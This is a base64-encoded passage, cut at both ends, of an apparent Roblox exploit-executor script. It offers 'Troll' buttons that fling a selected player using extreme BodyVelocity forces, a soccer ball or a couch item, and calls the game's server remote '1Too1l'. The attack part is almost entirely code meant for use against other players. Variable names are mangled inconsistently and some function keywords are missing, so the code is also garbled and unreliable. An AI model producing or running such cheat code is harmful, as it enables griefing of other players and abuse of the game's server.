mtzcGFjZS5GYWxsZW5QYXJ0c0Rlc3Ryb3lIZWlnaHQgPSAwLzAKICAgICAgICAgICAgbG9jYWwgdmFyX3hzMHpzaCA9IEluc3RhbmNlLm5ldygiQm9keVZlbG9jaXR5IikKICAgICAgICAgICAgYnYuTmFtZSA9ICJGbGluZ0ZvcmNlIgogICAgICAgICAgICBidi5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDllOCwgOWU4LCA5ZTgpCiAgICAgICAgICAgIGJ2Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcoMS8wLCAxLzAsIDEvMCkKICAgICAgICAgICAgYnYuUGFyZW50ID0gcm9vdAogICAgICAgICAgICBodW06U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCBmYWxzZSkKICAgICAgICAgICAgaHVtLlBsYXRmb3JtU3RhbmQgPSBmYWxzZQogICAgICAgICAgICBjYW0uQ2FtZXJhU3ViamVjdCA9IHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKSBvciB0Um9vdCBvciBodW0KCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbG9jYWwgdmFyX294ZDFwZyA9IDAKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9yNnFnejMgPSB7cm9vdH0KICAgICAgICAgICAgICAgIHdoaWxlIGZsaW5nQWN0aXZlIGFuZCB0YXJnZXQgYW5kIHRhcmdldC5DaGFyYWN0ZXIgYW5kIHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpIGRvCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyXzFwNjNvZyA9IHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgICAgICAgICAgaWYgdEh1bS5TaXQgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgICAgICBhbmdsZSArPSAxMDg0ODM5MwoKICAgICAgICAgICAgICAgICAgICBmb3IgXywgcGFydCBpbiBpcGFpcnMocGFydHMpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl83Yjk0cm4gPSB0YXJnZXQuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24uWAogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfeXk2OTlvID0gdGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uLlkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX2UzcTYxZSA9IHRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbi5aCiAgICAgICAgICAgICAgICAgICAgICAgIHBvc194ID0gcG9zX3ggKyAodGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5LlggLyAxLjUpCiAgICAgICAgICAgICAgICAgICAgICAgIHBvc195ID0gcG9zX3kgKyAodGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5LlkgLyAxLjUpCiAgICAgICAgICAgICAgICAgICAgICAgIHBvc196ID0gcG9zX3ogKyAodGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5LlogLyAxLjUpCiAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhwb3NfeCwgcG9zX3ksIHBvc196KSAqIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoYW5nbGUpLCAwLCAwKQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICByb290LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoOWU4LCA5ZTgsIDllOCkKICAgICAgICAgICAgICAgICAgICByb290LlJvdFZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoOWU4LCA5ZTgsIDllOCkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBmbGluZ0FjdGl2ZSA9IGZhbHNlCiAgICAgICAgICAgICAgICBidjpEZXN0cm95KCkKICAgICAgICAgICAgICAgIGh1bTpTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5TZWF0ZWQsIHRydWUpCiAgICAgICAgICAgICAgICBodW0uUGxhdGZvcm1TdGFuZCA9IGZhbHNlCiAgICAgICAgICAgICAgICByb290LkNGcmFtZSA9IG9yaWdpbmFsCiAgICAgICAgICAgICAgICBjYW0uQ2FtZXJhU3ViamVjdCA9IGh1bQogICAgICAgICAgICAgICAgZm9yIF8sIHAgaW4gcGFpcnMoY2hhcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHA6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcC5WZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICAgICAgICAgICAgICBwLlJvdFZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGh1bTpVbmVxdWlwVG9vbHMoKQogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKTpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCgpsb2NhbCB2YXJfcDVib2doIEZsaW5nQmFsbCh0YXJnZXQpCgogICAgbG9jYWwgdmFyX3hqcDl6ZyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCiAgICBsb2NhbCB2YXJfbTNhMTBqID0gcGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgdmFyX3QxNHJ4MiA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgbG9jYWwgdmFyX3gwYzFsMyA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIikKICAgIGxvY2FsIHZhcl85Y2o3bXAgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGxvY2FsIHZhcl9ucnFpNXUgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJCYWNrcGFjayIpCiAgICBsb2NhbCB2YXJfZzloejkxID0gd29ya3NwYWNlLldvcmtzcGFjZUNvbTpXYWl0Rm9yQ2hpbGQoIjAwMV9Tb2NjZXJCYWxscyIpCgogICAgbG9jYWwgdmFyX3M1ZDY2aiBHZXRCYWxsKCkKICAgICAgICBpZiBub3QgYmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlNvY2NlckJhbGwiKSB0aGVuCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIik6SW52b2tlU2VydmVyKCJQaWNraW5nVG9vbHMiLCAiU29jY2VyQmFsbCIpCiAgICAgICAgZW5kCiAgICAgICAgcmVwZWF0IHRhc2sud2FpdCgpIHVudGlsIGJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJTb2NjZXJCYWxsIikKICAgICAgICBiYWNrcGFjay5Tb2NjZXJCYWxsLlBhcmVudCA9IGNoYXJhY3RlcgogICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBTZXJ2ZXJCYWxsczpGaW5kRmlyc3RDaGlsZCgiU29jY2VyIiAuLiBwbGF5ZXIuTmFtZSkKICAgICAgICBjaGFyYWN0ZXIuU29jY2VyQmFsbC5QYXJlbnQgPSBiYWNrcGFjawogICAgICAgIHJldHVybiBTZXJ2ZXJCYWxsczpGaW5kRmlyc3RDaGlsZCgiU29jY2VyIiAuLiBwbGF5ZXIuTmFtZSkKICAgIGVuZAoKICAgIGxvY2FsIHZhcl81dTI0MWkgPSBTZXJ2ZXJCYWxsczpGaW5kRmlyc3RDaGlsZCgiU29jY2VyIiAuLiBwbGF5ZXIuTmFtZSkgb3IgR2V0QmFsbCgpCiAgICBCYWxsLkNhbkNvbGxpZGUgPSBmYWxzZQogICAgQmFsbC5NYXNzbGVzcyA9IHRydWUKICAgIEJhbGwuQ3VzdG9tUGh5c2ljYWxQcm9wZXJ0aWVzID0gUGh5c2ljYWxQcm9wZXJ0aWVzLm5ldygwLjAwMDEsIDAsIDApCgogICAgaWYgdGFyZ2V0IH49IHBsYXllciB0aGVuCiAgICAgICAgbG9jYWwgdmFyXzdzZHpsYiA9IHRhcmdldC5DaGFyYWN0ZXIKICAgICAgICBpZiB0Y2hhciBhbmQgdGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBhbmQgdGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbgogICAgICAgICAgICBsb2NhbCB2YXJfYTZsMzVpID0gdGNoYXIuSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICBsb2NhbCB2YXJfbTRvM3g3ID0gdGNoYXIuSHVtYW5vaWQKCiAgICAgICAgICAgIGlmIEJhbGw6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiQm9keVZlbG9jaXR5IikgdGhlbgogICAgICAgICAgICAgICAgQmFsbDpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJCb2R5VmVsb2NpdHkiKTpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsb2NhbCB2YXJfajZueTB2ID0gSW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiKQogICAgICAgICAgICBidi5OYW1lID0gIkZsaW5nUG93ZXIiCiAgICAgICAgICAgIGJ2LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoOWU4LCA5ZTgsIDllOCkKICAgICAgICAgICAgYnYuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsIG1hdGguaHVnZSwgbWF0aC5odWdlKQogICAgICAgICAgICBidi5QID0gOWU5MDAKICAgICAgICAgICAgYnYuUGFyZW50ID0gQmFsbAoKICAgICAgICAgICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IHRodW0KICAgICAgICAgICAgbG9jYWwgdmFyX2dzdTN6biA9IG9zLnRpbWUoKQogICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgIGlmIHRyb290LlZlbG9jaXR5Lk1hZ25pdHVkZSA+IDAgdGhlbgogICAgICAgICAgICAgICAgLS0gQ2FsY3VsYXRlIGFkanVzdGVkIHBvc2l0aW9uIGJhc2VkIG9uIHRhcmdldCdzIHZlbG9jaXR5CiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfNjh3YmplID0gdHJvb3QuUG9zaXRpb24uWCArICh0cm9vdC5WZWxvY2l0eS5YIC8gMS41KQogICAgICAgICAgICAgICAgbG9jYWwgdmFyXzBnaTJ2NiA9IHRyb290LlBvc2l0aW9uLlkgKyAodHJvb3QuVmVsb2NpdHkuWSAvIDEuNSkKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9uajFxbHEgPSB0cm9vdC5Qb3NpdGlvbi5aICsgKHRyb290LlZlbG9jaXR5LlogLyAxLjUpCgogICAgICAgICAgICAgICAgLS0gUG9zaXRpb24gdGhlIGJhbGwgZGlyZWN0bHkgYXQgdGhlIGFkanVzdGVkIHBvc2l0aW9uCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfNW15MmRiID0gVmVjdG9yMy5uZXcocG9zX3gsIHBvc195LCBwb3NfeikKICAgICAgICAgICAgICAgIEJhbGwuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhwb3NpdGlvbikKICAgICAgICAgICAgICAgIEJhbGwuT3JpZW50YXRpb24gKz0gVmVjdG9yMy5uZXcoNDg3LCA2OTAsIDM3MCkKZWxzZQpmb3IgaSwgdiBpbiBwYWlycyh0Y2hhcjpHZXRDaGlsZHJlbigpKSBkbwppZiB2OklzQSgiQmFzZVBhcnQiKSBhbmQgdi5DYW5Db2xsaWRlIGFuZCBub3Qgdi5BbmNob3JlZCB0aGVuCkJhbGwuQ0ZyYW1lID0gdi5DRnJhbWUKdGFzay53YWl0KDEvNjAwMCkKZW5kCmVuZAplbmQKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxLzYwMDApCiAgICAgICAgICAgIHVudGlsIHRyb290LlZlbG9jaXR5Lk1hZ25pdHVkZSA+IDEwMDAgb3IgdGh1bS5IZWFsdGggPD0gMCBvciBub3QgdGNoYXI6SXNEZXNjZW5kYW50T2Yod29ya3NwYWNlKSBvciB0YXJnZXQuUGFyZW50IH49IHBsYXllcnMKICAgICAgICAgICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IGh1bWFub2lkCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpUcm9sbDpBZGRCdXR0b24oewogICAgTmFtZSA9ICJGbGluZyBCYWxsIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIEZsaW5nQmFsbChnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKVtzZWxlY3RlZFBsYXllck5hbWVdKQogICAgZW5kCn0pCgpsb2NhbCB2YXJfZWlwdnVmID0gZ2FtZTpHZXRTZXJ2aWNlKCdQbGF5ZXJzJykKbG9jYWwgdmFyX3FucndzMCA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKCmxvY2FsIHZhcl9oY2FpOTIgaXNJdGVtSW5JbnZlbnRvcnkoaXRlbU5hbWUpCiAgICBmb3IgXywgaXRlbSBpbiBwYWlycyhscGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgaXRlbS5OYW1lID09IGl0ZW1OYW1lIHRoZW4KICAgICAgICAgICAgcmV0dXJuIHRydWUKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIGZhbHNlCmVuZAoKbG9jYWwgdmFyX21vdG94OCBlcXVpcEl0ZW0oaXRlbU5hbWUpCiAgICBsb2NhbCB2YXJfbGZmZjNhID0gbHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZChpdGVtTmFtZSkKICAgIGlmIGl0ZW0gdGhlbgogICAgICAgIGxwbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbChpdGVtKQogICAgZW5kCmVuZAoKbG9jYWwgdmFyX3JmdjZoZCB1bmVxdWlwSXRlbShpdGVtTmFtZSkKICAgIGxvY2FsIHZhcl8zdHZ5dDMgPSBscGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZChpdGVtTmFtZSkKICAgIGlmIGl0ZW0gdGhlbgogICAgICAgIGl0ZW0uUGFyZW50ID0gbHBsYXllci5CYWNrcGFjawogICAgZW5kCmVuZAoKbG9jYWwgdmFyX2l1YnN5bSBBY3RpdmVBdXRvRmxpbmcodGFyZ2V0UGxheWVyKQogICAgaWYgbm90IGlzSXRlbUluSW52ZW50b3J5KCJDb3VjaCIpIHRoZW4KICAgICAgICBsb2NhbCB2YXJfNHg1cXh6ID0geyBbMV0gPSAiUGlja2luZ1Rvb2xzIiwgWzJdID0gIkNvdWNoIiB9CiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKTpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgZW5kCgogICAgZXF1aXBJdGVtKCJDb3VjaCIpCiAgICBnZXRnZW52KCkuZmxpbmdsb29wID0gdHJ1ZQoKICAgIHdoaWxlIGdldGdlbnYoKS5mbGluZ2xvb3AgZG8KICAgICAgICBsb2NhbCB2YXJfd212djRpIGZsaW5nbG9vcGZpeCgpCiAgICAgICAgICAgIGxvY2FsIHZhcl95NjVrcG0gPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQogICAgICAgICAgICBsb2NhbCB2YXJfZmI3bGlzID0gUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgICAgICBsb2NhbCB2YXJfNHNiYWl3ID0gZmFsc2UKCiAgICAgICAgICAgIGxvY2FsIHZhcl9mMnl1OGMgPSBmdW5jdGlvbihUYXJnZXRQbGF5ZXIpCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfdzV5eGtuID0gUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgbG9jYWwgdmFyXzk3eWcwNCA9IENoYXJhY3RlciBhbmQgQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgbG9jYWwgdmFyX3h0ejVtaSA9IEh1bWFub2lkIGFuZCBIdW1hbm9pZC5Sb290UGFydAogICAgICAgICAgICAgICAgbG9jYWwgdmFyX2lmd3R0eSA9IFRhcmdldFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9pNW1iNXUsIFRSb290UGFydCwgVEhlYWQsIEFjY2Vzc29yeSwgSGFuZGxlCgogICAgICAgICAgICAgICAgaWYgVENoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikgdGhlbgogICAgICAgICAgICAgICAgICAgIFRIdW1hbm9pZCA9IFRDaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGlmIFRIdW1hbm9pZCBhbmQgVEh1bWFub2lkLlJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICBUUm9vdFBhcnQgPSBUSHVtYW5vaWQuUm9vdFBhcnQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgVENoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBUSGVhZCA9IFRDaGFyYWN0ZXIuSGVhZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBpZiBUQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiQWNjZXNzb3J5IikgdGhlbgogICAgICAgICAgICAgICAgICAgIEFjY2Vzc29yeSA9IFRDaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJBY2Nlc3NvcnkiKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBpZiBBY2Nlc3NvcnkgYW5kIEFjY2Vzc29yeTpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlIikgdGhlbgogICAgICAgICAgICAgICAgICAgIEhhbmRsZSA9IEFjY2Vzc29yeS5IYW5kbGUKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIENoYXJhY3RlciBhbmQgSHVtYW5vaWQgYW5kIFJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBSb290UGFydC5WZWxvY2l0eS5NYWduaXR1ZGUgPCA1MCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGdldGdlbnYoKS5PbGRQb3MgPSBSb290UGFydC5DRnJhbWUKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBUSHVtYW5vaWQgYW5kIFRIdW1hbm9pZC5TaXQgYW5kIG5vdCBBbGxCb29sIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdW5lcXVpcEl0ZW0oIkNvdWNoIikKICAgICAgICAgICAgICAgICAgICAgICAgZ2V0Z2VudigpLmZsaW5nbG9vcCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIFRIZWFkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IFRIZWFkCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIG5vdCBUSGVhZCBhbmQgSGFuZGxlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IEhhbmRsZQogICAgICAgICAgICAgICAgICAgIGVsc2VpZiBUSHVtYW5vaWQgYW5kIFRSb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNhbWVyYVN1YmplY3QgPSBUSHVtYW5vaWQKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IFRDaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfNWd5aGsyID0gZnVuY3Rpb24oQmFzZVBhcnQsIFBvcywgQW5nKQogICAgICAgICAgICAgICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KEJhc2VQYXJ0LlBvc2l0aW9uKSAqIFBvcyAqIEFuZwogICAgICAgICAgICAgICAgICAgICAgICBDaGFyYWN0ZXI6U2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lLm5ldyhCYXNlUGFydC5Qb3NpdGlvbikgKiBQb3MgKiBBbmcpCiAgICAgICAgICAgICAgICAgICAgICAgIFJvb3RQYXJ0LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoOWU3LCA5ZTcgKiAxMCwgOWU3KQogICAgICAgICAgICAgICAgICAgICAgICBSb290UGFydC5Sb3RWZWxvY2l0eSA9IFZlY3RvcjMubmV3KDllOCwgOWU4LCA5ZTgpCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl93bzh5ZmUgPSBmdW5jdGlvbihCYXNlUGFydCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX3Vnc25kcyA9IDIKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX3E2cno5dyA9IHRpY2soKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfY24ycTZqID0gMAogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFJvb3RQYXJ0IGFuZCBUSHVtYW5vaWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEJhc2VQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVkZSA8IDUwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQW5nbGUgPSBBbmdsZSArIDk3NjAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLCAxLjUsIDApICsgVEh1bWFub2lkLk1vdmVEaXJlY3Rpb24gKiBCYXNlUGFydC5WZWxvY2l0eS5NYWduaXR1ZGUgLyAxLjI1LCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKEFuZ2xlKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENGcmFtZS5uZXcoMCwgLTEuNSwgMCkgKyBUSHVtYW5vaWQuTW92ZURpcmVjdGlvbiAqIEJhc2VQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVkZSAvIDEuMjUsIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGUpLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygyLjI1LCAxLjUsIC0yLjI1KSArIFRIdW1hbm9pZC5Nb3ZlRGlyZWN0aW9uICogQmFzZVBhcnQuVmVsb2NpdHkuTWFnbml0dWRlIC8gMS4yNSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZSksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KC0yLjI1LCAtMS41LCAyLjI1KSArIFRIdW1hbm9pZC5Nb3ZlRGlyZWN0aW9uICogQmFzZVBhcnQuVmVsb2NpdHkuTWFnbml0dWRlIC8gMS4yNSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZSksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsIDEuNSwgMCkgKyBUSHVtYW5vaWQuTW92ZURpcmVjdGlvbiwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZSksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsIC0xLjUsIDApICsgVEh1bWFub2lkLk1vdmVEaXJlY3Rpb24sIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGUpLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENGcmFtZS5uZXcoMCwgMS41LCBUSHVtYW5vaWQuV2Fsa1NwZWVkKSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZCg5MCksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsIC0xLjUsIC1USHVtYW5vaWQuV2Fsa1NwZWVkKSwgQ0ZyYW1lLkFuZ2xlcygwLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLCAxLjUsIFRIdW1hbm9pZC5XYWxrU3BlZWQpLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKDkwKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENGcmFtZS5uZXcoMCwgMS41LCBUUm9vdFBhcnQuVmVsb2NpdHkuTWFnbml0dWRlIC8gMS4yNSksIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoOTApLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLCAtMS41LCAtVFJvb3RQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVkZSAvIDEuMjUpLCBDRnJhbWUuQW5nbGVzKDAsIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsIDEuNSwgVFJvb3RQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVkZSAvIDEuMjUpLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKDkwKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENGcmFtZS5uZXcoMCwgLTEuNSwgMCksIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoOTApLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICA